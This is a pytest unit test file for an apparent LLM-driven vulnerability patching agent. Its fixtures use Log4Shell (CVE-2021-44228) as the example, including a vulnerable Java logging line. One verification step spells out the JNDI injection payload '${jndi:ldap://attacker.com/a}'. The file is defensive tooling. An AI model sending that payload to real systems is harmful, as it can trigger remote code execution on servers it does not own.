"""Unit tests for PatchGenieAgent and PatchReport models."""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

import pytest
from pydantic import ValidationError

from patchgenie.agent import _SYSTEM_PROMPT, PatchGenieAgent
from patchgenie.models import PatchReport, VulnerabilityInput

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

SAMPLE_VULN = VulnerabilityInput(
    cve_id="CVE-2021-44228",
    description=(
        "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, "
        "and parameters do not protect against attacker controlled LDAP and other JNDI "
        "related endpoints. An attacker who can control log messages or log message "
        "parameters can execute arbitrary code loaded from LDAP servers."
    ),
    language="Java",
    vulnerable_code=(
        'logger.info("Request received: " + userInput);'
    ),
    additional_context="Spring Boot 2.5.6, Log4j2 2.14.1",
)

SAMPLE_REPORT_DICT = {
    "cve_id": "CVE-2021-44228",
    "vulnerability_analysis": (
        "Log4Shell: JNDI injection via attacker-controlled log messages allows RCE."
    ),
    "vulnerable_code_block": 'logger.info("Request received: " + userInput);',
    "secure_patch": (
        "// Upgrade Log4j2 to >=2.17.1 and use parameterised logging:\n"
        'logger.info("Request received: {}", userInput);'
    ),
    "verification_steps": [
        (
            "Exploit PoC (Python): send '${jndi:ldap://attacker.com/a}' as userInput "
            "and observe callback."
        ),
        "Unit Test: assert logger output does not trigger JNDI lookup after patch.",
    ],
}


def _make_mock_completion(content: str) -> MagicMock:
    """Build a minimal mock that mirrors openai.ChatCompletion structure."""
    message = MagicMock()
    message.content = content
    choice = MagicMock()
    choice.message = message
    completion = MagicMock()
    completion.choices = [choice]
    return completion


# ---------------------------------------------------------------------------
# VulnerabilityInput model tests
# ---------------------------------------------------------------------------


class TestVulnerabilityInput:
    def test_required_fields(self):
        vuln = VulnerabilityInput(cve_id="CVE-2024-0001", description="Test vuln")
        assert vuln.cve_id == "CVE-2024-0001"
        assert vuln.description == "Test vuln"
        assert vuln.language == ""
        assert vuln.vulnerable_code == ""
        assert vuln.additional_context == ""

    def test_full_construction(self):
        vuln = SAMPLE_VULN
        assert vuln.language == "Java"
        assert "logger" in vuln.vulnerable_code


# ---------------------------------------------------------------------------
# PatchReport model tests
# ---------------------------------------------------------------------------


class TestPatchReport:
    def test_valid_report(self):
        report = PatchReport(**SAMPLE_REPORT_DICT)
        assert report.cve_id == "CVE-2021-44228"
        assert len(report.verification_steps) == 2

    def test_verification_steps_must_be_list(self):
        data = {**SAMPLE_REPORT_DICT, "verification_steps": "not a list"}
        with pytest.raises(ValidationError):
            PatchReport(**data)

    def test_model_dump_json_roundtrip(self):
        report = PatchReport(**SAMPLE_REPORT_DICT)
        serialised = report.model_dump_json()
        reloaded = PatchReport.model_validate_json(serialised)
        assert reloaded == report


# ---------------------------------------------------------------------------
# PatchGenieAgent construction tests
# ---------------------------------------------------------------------------


class TestPatchGenieAgentConstruction:
    def test_raises_without_api_key(self, monkeypatch):
        monkeypatch.delenv("OPENAI_API_KEY", raising=False)
        with pytest.raises(ValueError, match="API key"):
            PatchGenieAgent(api_key=None)

    def test_default_model(self, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
        monkeypatch.delenv("PATCHGENIE_MODEL", raising=False)
        agent = PatchGenieAgent()
        assert agent._model == "gpt-5.4"

    def test_model_env_override(self, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
        monkeypatch.setenv("PATCHGENIE_MODEL", "gpt-4-turbo")
        agent = PatchGenieAgent()
        assert agent._model == "gpt-4-turbo"

    def test_model_kwarg_override(self, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
        agent = PatchGenieAgent(model="o1-preview")
        assert agent._model == "o1-preview"


# ---------------------------------------------------------------------------
# PatchGenieAgent._build_user_message tests
# ---------------------------------------------------------------------------


class TestBuildUserMessage:
    def test_contains_cve_id(self):
        msg = PatchGenieAgent._build_user_message(SAMPLE_VULN)
        assert "CVE-2021-44228" in msg

    def test_contains_description(self):
        msg = PatchGenieAgent._build_user_message(SAMPLE_VULN)
        assert "Log4j2" in msg

    def test_contains_language(self):
        msg = PatchGenieAgent._build_user_message(SAMPLE_VULN)
        assert "Java" in msg

    def test_contains_code_block(self):
        msg = PatchGenieAgent._build_user_message(SAMPLE_VULN)
        assert "logger" in msg

    def test_omits_optional_fields_when_empty(self):
        minimal = VulnerabilityInput(cve_id="N/A", description="minimal")
        msg = PatchGenieAgent._build_user_message(minimal)
        assert "Language" not in msg
        assert "```" not in msg
        assert "Additional context" not in msg


# ---------------------------------------------------------------------------
# PatchGenieAgent._parse_response tests
# ---------------------------------------------------------------------------


class TestParseResponse:
    def test_valid_json(self):
        raw = json.dumps(SAMPLE_REPORT_DICT)
        report = PatchGenieAgent._parse_response(raw, "CVE-2021-44228")
        assert isinstance(report, PatchReport)
        assert report.cve_id == "CVE-2021-44228"

    def test_cve_id_fallback(self):
        # Model omits cve_id; agent should inject it from the input.
        data = {k: v for k, v in SAMPLE_REPORT_DICT.items() if k != "cve_id"}
        raw = json.dumps(data)
        report = PatchGenieAgent._parse_response(raw, "CVE-2021-44228")
        assert report.cve_id == "CVE-2021-44228"

    def test_invalid_json_raises(self):
        with pytest.raises(ValueError, match="non-JSON"):
            PatchGenieAgent._parse_response("not json", "CVE-X")

    def test_schema_mismatch_raises(self):
        # verification_steps missing
        data = {
            "cve_id": "CVE-X",
            "vulnerability_analysis": "X",
            "vulnerable_code_block": "X",
            "secure_patch": "X",
        }
        with pytest.raises(ValueError, match="schema"):
            PatchGenieAgent._parse_response(json.dumps(data), "CVE-X")


# ---------------------------------------------------------------------------
# PatchGenieAgent.analyse integration (mocked OpenAI)
# ---------------------------------------------------------------------------


class TestAnalyse:
    @pytest.fixture()
    def agent(self, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
        return PatchGenieAgent()

    def test_returns_patch_report(self, agent):
        mock_completion = _make_mock_completion(json.dumps(SAMPLE_REPORT_DICT))
        with patch.object(agent._client.chat.completions, "create", return_value=mock_completion):
            report = agent.analyse(SAMPLE_VULN)

        assert isinstance(report, PatchReport)
        assert report.cve_id == "CVE-2021-44228"

    def test_system_prompt_sent(self, agent):
        mock_completion = _make_mock_completion(json.dumps(SAMPLE_REPORT_DICT))
        with patch.object(
            agent._client.chat.completions, "create", return_value=mock_completion
        ) as mock_create:
            agent.analyse(SAMPLE_VULN)

        call_kwargs = mock_create.call_args
        messages = call_kwargs.kwargs.get("messages") or call_kwargs.args[0]
        system_msgs = [m for m in messages if m["role"] == "system"]
        assert system_msgs, "No system message found"
        assert _SYSTEM_PROMPT in system_msgs[0]["content"]

    def test_temperature_is_low(self, agent):
        mock_completion = _make_mock_completion(json.dumps(SAMPLE_REPORT_DICT))
        with patch.object(
            agent._client.chat.completions, "create", return_value=mock_completion
        ) as mock_create:
            agent.analyse(SAMPLE_VULN)

        temperature = mock_create.call_args.kwargs.get("temperature")
        assert temperature is not None and temperature <= 0.3

    def test_json_object_response_format(self, agent):
        mock_completion = _make_mock_completion(json.dumps(SAMPLE_REPORT_DICT))
        with patch.object(
            agent._client.chat.completions, "create", return_value=mock_completion
        ) as mock_create:
            agent.analyse(SAMPLE_VULN)

        response_format = mock_create.call_args.kwargs.get("response_format")
        assert response_format == {"type": "json_object"}

    def test_propagates_openai_error(self, agent):
        import openai as _openai

        with patch.object(
            agent._client.chat.completions,
            "create",
            side_effect=_openai.APIConnectionError(request=MagicMock()),
        ):
            with pytest.raises(_openai.APIConnectionError):
                agent.analyse(SAMPLE_VULN)


# ---------------------------------------------------------------------------
# System prompt content checks
# ---------------------------------------------------------------------------


class TestSystemPrompt:
    def test_mentions_secure_by_design(self):
        assert "Secure by Design" in _SYSTEM_PROMPT

    def test_mentions_no_quick_fixes(self):
        assert "quick fix" in _SYSTEM_PROMPT.lower() or "suppressing warnings" in _SYSTEM_PROMPT

    def test_mentions_json_output_format(self):
        assert "cve_id" in _SYSTEM_PROMPT
        assert "vulnerability_analysis" in _SYSTEM_PROMPT
        assert "secure_patch" in _SYSTEM_PROMPT
        assert "verification_steps" in _SYSTEM_PROMPT
